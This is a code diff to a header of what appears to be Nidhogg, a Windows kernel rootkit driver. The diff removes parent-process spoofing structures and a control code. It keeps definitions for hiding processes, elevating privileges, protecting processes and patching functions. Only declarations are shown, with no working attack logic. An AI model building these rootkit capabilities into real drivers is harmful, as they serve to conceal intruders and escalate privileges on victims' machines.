@@ -15,7 +15,6 @@
 #define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_PROCESS_SPOOFING CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -72,7 +71,6 @@ PVOID RegistrationHandle = NULL;
 struct EnabledFeatures {
 	bool FunctionPatching  = true;
 	bool RegistryFeatures  = true;
-	bool PPIDSpoofing	   = true;
 	bool ProcessProtection = true;
 	bool FileProtection	   = true;
 };
@@ -106,33 +104,18 @@ struct PatchedModule {
 // ----------------------------------------------------------------------------
 
 // --- ProcessUtils structs ---------------------------------------------------
-struct Process {
-	int type;
-	ULONG ProcessPid;
-	ULONG SpoofedPid;
-};
-
-struct SpoofedProcessesList {
-	int PidsCount;
-	FastMutex Lock;
-	Process* Processes[MAX_PIDS];
-};
-
 struct ProcessesList {
 	int PidsCount;
-	FastMutex Lock;
 	ULONG Processes[MAX_PIDS];
 };
 
 struct ProcessGlobals {
 	ProcessesList ProtectedProcesses;
-	SpoofedProcessesList SpoofedProcesses;
+	FastMutex Lock;
 
 	void Init() {
 		ProtectedProcesses.PidsCount = 0;
-		SpoofedProcesses.PidsCount = 0;
-		ProtectedProcesses.Lock.Init();
-		SpoofedProcesses.Lock.Init();
+		Lock.Init();
 	}
 };
 ProcessGlobals pGlobals;
